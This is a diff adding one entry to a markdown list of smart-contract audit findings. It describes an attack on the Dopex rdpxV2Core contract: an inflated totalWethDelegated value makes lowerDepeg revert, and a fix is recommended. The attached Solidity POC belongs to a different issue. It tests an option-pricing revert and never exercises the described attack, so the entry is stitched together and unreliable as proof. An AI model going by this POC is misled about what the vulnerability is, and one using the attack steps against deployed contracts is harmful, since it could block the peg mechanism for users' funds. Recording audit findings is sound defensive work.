@@ -559,3 +559,42 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 7.[High] The peg stability module can be compromised by forcing lowerDepeg to revert
+
+### update the totalWethDelegated
+
+- Summary: 1) The attacker calls the addToDelegate function and deposits WETH into the rpdxV2Core contract, increasing the totalWethDelegated state variable. 2) Subsequently, the attacker calls the withdraw function, which does not update the totalWethDelegated variable, leaving it inflated. 3) The attacker then calls the sync function, inaccurately updating the WETH reserves by subtracting the inflated totalWethDelegated value. 4) When the admin attempts to restore the dpxETH/ETH peg by calling the lowerDepeg function, it reverts due to an underflow error caused by the manipulated WETH reserves.
+
+- Impact & Recommendation: Update the totalWethDelegated in the `withdraw` function.
+  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-08-the-peg-stability-module-can-be-compromised-by-forcing-lowerdepeg-to-revert) & [Report](https://code4rena.com/reports/2023-08-dopex)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+      function testOptionPricingRevert() public {
+        OptionPricingSimple optionPricingSimple;
+        optionPricingSimple = new OptionPricingSimple(100, 5e6);
+        (uint256 rdpxRequired, uint256 wethRequired) = rdpxV2Core
+            .calculateBondCost(1 * 1e18, 0);
+        uint256 currentPrice = vault.getUnderlyingPrice(); // price of underlying wrt collateralToken
+        uint256 strike = vault.roundUp(currentPrice - (currentPrice / 4)); // 25% below the current price
+        // around 14 minutes before next funding payment
+        vm.warp(block.timestamp + 7 days - 863 seconds);
+        uint256 timeToExpiry = vault.nextFundingPaymentTimestamp() -
+            block.timestamp;
+        console.log("What is the current price");
+        console.log(currentPrice);
+        console.log("What is the strike");
+        console.log(strike);
+        console.log("What is time to expiry");
+        console.log(timeToExpiry);
+        uint256 price = vault.getUnderlyingPrice();
+        // will revert
+        vm.expectRevert();
+        optionPricingSimple.getOptionPrice(strike, price, 100, timeToExpiry);
+    }
+
+  ```
+
+  </details>
